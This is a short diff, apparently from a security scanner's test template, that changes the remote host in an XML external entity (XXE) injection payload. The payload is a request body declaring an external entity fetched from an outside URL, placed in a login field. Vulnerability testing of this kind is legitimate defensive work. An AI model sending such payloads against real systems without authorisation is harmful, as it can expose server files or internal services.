@@ -48,7 +48,7 @@ Pragma: no-cache
 Cache-Control: no-cache
 
 <?xml version="1.0"?>
-<!DOCTYPE root[<!ENTITY xxetest SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">
+<!DOCTYPE root[<!ENTITY xxetest SYSTEM "http://sn1persecurity.com/.testing/rfi_vuln.txt">
 ]>
 <reset>
   <login>&xxetest;</login>
